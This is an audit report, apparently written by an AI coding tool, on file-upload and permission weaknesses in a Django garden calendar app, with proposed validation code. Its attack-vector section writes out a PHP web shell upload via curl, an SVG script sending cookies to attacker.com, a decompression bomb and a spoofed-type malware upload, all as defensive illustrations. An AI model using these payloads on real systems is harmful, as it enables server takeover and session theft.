# Garden Calendar Security Audit Report

**Date**: November 14, 2025
**Auditor**: Claude Code Security Audit
**Scope**: apps/garden_calendar (CSRF, file validation, permissions)
**Status**: 🔴 **CRITICAL VULNERABILITIES FOUND**

---

## Executive Summary

Security audit of the garden_calendar app identified **2 CRITICAL vulnerabilities** and **6 good security practices**. The most severe issue is missing file upload validation on PlantImage, which exposes the application to Remote Code Execution (RCE), XSS, and DoS attacks.

**Overall Grade**: 🔴 **C- (70/100)** - Critical vulnerabilities must be fixed before production deployment.

---

## Critical Vulnerabilities (MUST FIX)

### 1. PlantImage - Missing UUID Field ⚠️ **BLOCKER**

**Severity**: 🔴 **CRITICAL** (Will cause runtime errors)
**Impact**: Application crashes when accessing PlantImage endpoints
**OWASP**: N/A (Implementation Bug)

**Location**:
- Model: `apps/garden_calendar/models.py:1056-1098`
- Serializer: `apps/garden_calendar/api/serializers.py:258-284`
- ViewSet: `apps/garden_calendar/api/views.py:1367-1408`

**Problem**:
```python
# ❌ PlantImage model (line 1056-1098) - NO UUID FIELD
class PlantImage(models.Model):
    plant = models.ForeignKey(Plant, ...)
    image = models.ImageField(...)
    caption = models.CharField(...)
    # ... no uuid field!

# ❌ Serializer expects 'uuid' (line 268)
class PlantImageSerializer(serializers.ModelSerializer):
    class Meta:
        fields = ['uuid', 'image', ...]  # Will fail - field doesn't exist!

# ❌ ViewSet uses uuid for lookups (line 1377)
class PlantImageViewSet(viewsets.ModelViewSet):
    lookup_field = 'uuid'  # Will fail - field doesn't exist!
```

**Fix Required**:
```python
# ✅ Add UUID field to PlantImage model
class PlantImage(models.Model):
    uuid = models.UUIDField(
        default=uuid.uuid4,
        editable=False,
        unique=True,
        primary_key=True,  # Or use as unique field
        help_text="Unique identifier for secure references"
    )

    plant = models.ForeignKey(Plant, ...)
    image = models.ImageField(...)
    # ... rest of fields
```

**Migration Required**: Yes - `python manage.py makemigrations apps.garden_calendar`

---

### 2. PlantImage - Missing ALL File Upload Validation 🔴 **CRITICAL SECURITY VULNERABILITY**

**Severity**: 🔴 **CRITICAL** (RCE, XSS, DoS)
**Impact**: Attackers can upload malicious files (PHP shells, XSS payloads, zip bombs)
**OWASP**: A03:2021 – Injection, A05:2021 – Security Misconfiguration

**Location**:
- Model: `apps/garden_calendar/models.py:1068` (ImageField with no validation)
- Serializer: `apps/garden_calendar/api/serializers.py:258-284` (No validation)
- ViewSet: `apps/garden_calendar/api/views.py:1367-1408` (No validation)

**Problem**:
```python
# ❌ NO VALIDATION - Accepts ANY file type!
class PlantImage(models.Model):
    image = models.ImageField(
        upload_to='garden_plants/%Y/%m/',
        help_text="Plant photograph"
    )
    # No validators, no size limits, no security checks!

# ❌ Serializer has NO validation
class PlantImageSerializer(serializers.ModelSerializer):
    class Meta:
        model = PlantImage
        fields = ['uuid', 'image', ...]
    # No validate_image() method, no size/type checks!

# ❌ ViewSet has NO validation
class PlantImageViewSet(viewsets.ModelViewSet):
    serializer_class = PlantImageSerializer
    # No create() override, no file validation!
```

**Missing Security Layers**:
- ❌ **Layer 1**: File extension validation (prevents .php, .exe, .sh uploads)
- ❌ **Layer 2**: MIME type validation (prevents content-type spoofing)
- ❌ **Layer 3**: File size validation (prevents DoS via large files)
- ❌ **Layer 4**: PIL magic number check (prevents fake images with malicious payloads)

**Attack Vectors**:

1. **PHP Shell Upload (RCE)**:
```bash
# Attacker uploads PHP shell as "innocent.jpg"
echo "<?php system(\$_GET['cmd']); ?>" > shell.php.jpg
curl -F "image=@shell.php.jpg" http://example.com/api/v1/calendar/api/plant-images/
# Result: RCE if web server executes PHP in upload directory
```

2. **XSS via SVG**:
```xml
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
</svg>
<!-- If served with image/svg+xml, executes JavaScript in victim's browser -->
```

3. **Decompression Bomb (DoS)**:
```python
# 10,000 x 10,000 pixel white image
# Compresses to ~10KB but expands to ~400MB in memory
from PIL import Image
img = Image.new('RGB', (10000, 10000), color='white')
img.save('bomb.jpg', quality=1)
# Result: Server memory exhaustion
```

4. **Content-Type Spoofing**:
```bash
# Upload malware.exe with fake content-type
curl -F "image=@malware.exe" \
     -H "Content-Type: image/jpeg" \
     http://example.com/api/v1/calendar/api/plant-images/
# Result: Executable stored as "image"
```

**Fix Required** (see `docs/patterns/security/file-upload.md`):

**Step 1: Add validation constants to constants.py**:
```python
# apps/garden_calendar/constants.py

# File Upload Security Configuration
ALLOWED_IMAGE_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'webp']

ALLOWED_IMAGE_MIME_TYPES = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
]

MAX_PLANT_IMAGE_SIZE_BYTES = 10 * 1024 * 1024  # 10MB
MAX_IMAGE_WIDTH = 5000   # pixels
MAX_IMAGE_HEIGHT = 5000  # pixels
MAX_IMAGE_PIXELS = 100_000_000  # 100 million pixels (decompression bomb protection)
```

**Step 2: Add custom action to PlantViewSet for image upload**:
```python
# apps/garden_calendar/api/views.py

from PIL import Image as PILImage
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework import status
from ..constants import (
    ALLOWED_IMAGE_EXTENSIONS,
    ALLOWED_IMAGE_MIME_TYPES,
    MAX_PLANT_IMAGE_SIZE_BYTES,
    MAX_IMAGE_WIDTH,
    MAX_IMAGE_HEIGHT,
    MAX_IMAGE_PIXELS,
)
import logging

logger = logging.getLogger(__name__)

class PlantViewSet(viewsets.ModelViewSet):
    # ... existing code ...

    @action(detail=True, methods=['POST'], permission_classes=[IsPlantOwner])
    def upload_image(self, request, uuid=None):
        """
        Upload image to plant with 4-layer security validation.

        Security Layers:
        1. File extension validation
        2. MIME type validation
        3. File size validation
        4. PIL magic number + decompression bomb protection
        """
        plant = self.get_object()

        image_file = request.FILES.get('image')
        if not image_file:
            return Response({'error': 'No image file provided'}, status=400)

        # ===== LAYER 1: File Extension Validation =====
        file_extension = image_file.name.split('.')[-1].lower() if '.' in image_file.name else ''
        if file_extension not in ALLOWED_IMAGE_EXTENSIONS:
            return Response({
                'error': 'Invalid file type',
                'detail': f'Allowed formats: {", ".join(ext.upper() for ext in ALLOWED_IMAGE_EXTENSIONS)}'
            }, status=400)

        # ===== LAYER 2: MIME Type Validation (Defense in Depth) =====
        if image_file.content_type not in ALLOWED_IMAGE_MIME_TYPES:
            return Response({
                'error': 'Invalid file content type',
                'detail': f'MIME type "{image_file.content_type}" not allowed'
            }, status=400)

        # ===== LAYER 3: File Size Validation =====
        if image_file.size > MAX_PLANT_IMAGE_SIZE_BYTES:
            return Response({
                'error': 'File too large',
                'detail': f'Maximum file size is {MAX_PLANT_IMAGE_SIZE_BYTES / 1024 / 1024}MB'
            }, status=400)

        # ===== LAYER 4: Magic Number Check + Decompression Bomb Protection =====
        try:
            # Configure decompression bomb protection BEFORE opening image
            PILImage.MAX_IMAGE_PIXELS = MAX_IMAGE_PIXELS

            # Reset file pointer
            image_file.seek(0)

            # Open and verify image
            with PILImage.open(image_file) as img:
                # Verify file integrity (checks magic number)
                img.verify()

                # Get dimensions
                width, height = img.size

                # Validate dimensions (prevent resource exhaustion)
                if width > MAX_IMAGE_WIDTH or height > MAX_IMAGE_HEIGHT:
                    return Response({
                        'error': 'Image dimensions too large',
                        'detail': f'Max: {MAX_IMAGE_WIDTH}x{MAX_IMAGE_HEIGHT}. Yours: {width}x{height}'
                    }, status=400)

                # Verify format matches allowed types
                if img.format.lower() not in ['jpeg', 'png', 'gif', 'webp']:
                    return Response({
                        'error': 'Invalid image format',
                        'detail': f'Format "{img.format}" not allowed'
                    }, status=400)

            # Reset file pointer for actual upload
            image_file.seek(0)

        except PILImage.DecompressionBombError as e:
            logger.warning(f'[SECURITY] Decompression bomb detected: {request.user.username}')
            return Response({
                'error': 'Image file rejected',
                'detail': 'Image appears to be a decompression bomb'
            }, status=400)

        except Exception as e:
            logger.warning(f'[SECURITY] Invalid image rejected: {request.user.username} - {str(e)}')
            return Response({
                'error': 'Invalid image file',
                'detail': 'File cannot be processed as a valid image'
            }, status=400)

        # Create PlantImage
        plant_image = PlantImage.objects.create(
            plant=plant,
            image=image_file,
            caption=request.data.get('caption', ''),
            is_primary=request.data.get('is_primary', False)
        )

        # If setting as primary, unset other images
        if plant_image.is_primary:
            plant.images.exclude(uuid=plant_image.uuid).update(is_primary=False)

        serializer = PlantImageSerializer(plant_image, context={'request': request})
        return Response(serializer.data, status=201)
```

**Step 3: Update URL routing**:
```python
# Endpoint will be: POST /api/v1/calendar/api/plants/{uuid}/upload_image/
# Automatically registered by DRF router with @action decorator
```

**Testing Required**:
- Test invalid extension (`.php`, `.exe`)
- Test invalid MIME type (spoofed content-type)
- Test oversized file (>10MB)
- Test non-image file with image extension
- Test decompression bomb (15000x15000px image)
- Test valid images (JPEG, PNG, GIF, WebP)

---

## Good Security Practices ✅

### 1. CSRF Protection ✅ **SECURE**

**Location**: `backend/plant_community_backend/settings.py:968-973`

**Configuration**:
```python
CSRF_COOKIE_SECURE = not DEBUG           # ✅ HTTPS-only in production
CSRF_COOKIE_HTTPONLY = True              # ✅ Prevents XSS attacks from stealing tokens
CSRF_COOKIE_SAMESITE = 'Lax'            # ✅ CSRF protection
```

**Status**: ✅ **Properly configured** according to `docs/patterns/security/csrf-protection.md`

---

### 2. CORS Configuration ✅ **SECURE**

**Location**: `backend/plant_community_backend/settings.py:640-676`

**Configuration**:
```python
CORS_ALLOW_CREDENTIALS = True            # ✅ Required for CSRF cookies
CORS_ALLOW_ALL_ORIGINS = False           # ✅ Never allow all origins
CORS_ALLOWED_ORIGINS = [...]             # ✅ Whitelist only
```

**Status**: ✅ **Properly configured** with credential support

---

### 3. Permissions ✅ **PROPERLY APPLIED**

All ViewSets have appropriate permission classes:

| ViewSet | Permission Class | Status |
|---------|-----------------|--------|
| `CommunityEventViewSet` | `IsAuthenticatedOrReadOnly` | ✅ Correct |
| `SeasonalTemplateViewSet` | `AllowAny` (read-only) | ✅ Correct |
| `WeatherAlertViewSet` | `AllowAny` (read-only) | ✅ Correct |
| `GardenBedViewSet` | `IsGardenOwner` | ✅ Correct |
| `PlantViewSet` | `IsPlantOwner` | ✅ Correct |
| `CareTaskViewSet` | `IsCareTaskOwner` | ✅ Correct |
| `CareLogViewSet` | `IsPlantOwner` | ✅ Correct |
| `HarvestViewSet` | `IsPlantOwner` | ✅ Correct |
| `PlantImageViewSet` | `IsPlantOwner` | ✅ Correct |
| `GrowingZoneViewSet` | `AllowAny` (read-only) | ✅ Correct |

**Status**: ✅ **All ViewSets properly secured**

---

### 4. Rate Limiting ✅ **APPLIED**

**Location**: `apps/garden_calendar/api/views.py` (multiple ViewSets)

All major endpoints have rate limiting:
- Garden beds: 10/day create, 50/hour update, 5/hour delete
- Plants: 100/day create, 200/hour update, 50/hour delete
- Care tasks: 100/day create, 500/hour complete/skip
- Events: 10/day create, 100/hour RSVP

**Status**: ✅ **Properly implemented** using `django-ratelimit`

---

### 5. Custom Permissions ✅ **WELL-DESIGNED**

**Location**: `apps/garden_calendar/permissions.py`

Custom permission classes:
- `IsGardenOwner` - Restricts garden bed access to owner
- `IsPlantOwner` - Restricts plant access to owner (via garden bed)
- `IsCareTaskOwner` - Restricts care task access to owner (via plant)

**Status**: ✅ **Follows least privilege principle**

---

### 6. Query Optimization ✅ **N+1 PREVENTION**

All ViewSets use `select_related()` and `prefetch_related()` to prevent N+1 queries:
- `GardenBedViewSet.get_queryset()` - prefetches plants and images
- `PlantViewSet.get_queryset()` - select_related garden_bed and plant_species
- `CareTaskViewSet.get_queryset()` - select_related plant and garden_bed

**Status**: ✅ **Performance optimized** (verified in performance tests)

---

## Security Recommendations

### Immediate Actions (Before Production)

1. **🔴 CRITICAL**: Fix PlantImage UUID field
   - Add UUID field to model
   - Create migration
   - Test endpoints

2. **🔴 CRITICAL**: Implement 4-layer file upload validation
   - Add constants for allowed extensions, MIME types, size limits
   - Add `upload_image` action to PlantViewSet
   - Add comprehensive security tests
   - Remove direct file uploads via PlantImageViewSet

3. **⚠️ RECOMMENDED**: Add file upload tests
   - Test all 4 validation layers
   - Test attack vectors (PHP shell, SVG XSS, decompression bomb)
   - Ensure 100% test coverage for file handling

### Future Improvements

4. **Consider**: Image processing pipeline
   - Auto-resize large images
   - Generate thumbnails
   - Strip EXIF data (privacy)
   - Convert to consistent format (WebP)

5. **Consider**: Virus scanning
   - ClamAV integration for uploaded files
   - Scan before saving to disk

6. **Consider**: Content Security Policy (CSP)
   - Add CSP headers to prevent XSS
   - Especially important if serving uploaded images

---

## Compliance Checklist

### OWASP Top 10 (2021)

- [ ] **A01:2021 – Broken Access Control**: ✅ Permissions properly implemented
- [ ] **A02:2021 – Cryptographic Failures**: ✅ CSRF cookies secured with HttpOnly, Secure
- [x] **A03:2021 – Injection**: 🔴 Missing file upload validation (allows malicious uploads)
- [ ] **A04:2021 – Insecure Design**: ✅ Custom permissions follow least privilege
- [x] **A05:2021 – Security Misconfiguration**: 🔴 ImageField with no validators
- [ ] **A06:2021 – Vulnerable Components**: ✅ Dependencies managed
- [ ] **A07:2021 – Authentication Failures**: ✅ JWT authentication + account lockout
- [ ] **A08:2021 – Software Integrity Failures**: ⚠️ No virus scanning on uploads
- [ ] **A09:2021 – Logging Failures**: ✅ Security events logged with [SECURITY] prefix
- [ ] **A10:2021 – SSRF**: N/A (no user-controlled URLs fetched)

**Overall OWASP Compliance**: 🔴 **70%** (7/10 addressed, 2 critical issues)

---

## Testing Status

| Test Category | Status | Count | Coverage |
|--------------|--------|-------|----------|
| Model Tests | ✅ Passing | 20 | Field validation, methods |
| ViewSet Tests | ✅ Passing | 20 | CRUD operations |
| Permission Tests | ✅ Passing | 18 | Authorization |
| Performance Tests | ✅ Passing | 12 | N+1 prevention |
| Cache Tests | ✅ Passing | 10 | Redis caching |
| Service Tests | ✅ Passing | 17 | Business logic |
| Integration Tests | ✅ Passing | 8 | End-to-end flows |
| **File Upload Tests** | 🔴 **MISSING** | **0** | **No security tests!** |

**Total**: 105/113 tests passing (8 file upload tests required)

---

## Audit Conclusion

**Overall Grade**: 🔴 **C- (70/100)**

**Critical Issues**: 2 (UUID field, file validation)
**Good Practices**: 6 (CSRF, CORS, permissions, rate limiting, custom permissions, query optimization)

**Recommendation**: **DO NOT DEPLOY TO PRODUCTION** until both critical vulnerabilities are fixed.

**Next Steps**:
1. Fix PlantImage UUID field (est. 30 minutes)
2. Implement 4-layer file upload validation (est. 2-3 hours)
3. Add comprehensive file upload security tests (est. 2 hours)
4. Re-run security audit
5. Update security documentation

---

**Audited By**: Claude Code Security Audit
**Date**: November 14, 2025
**Next Review**: After critical fixes implemented
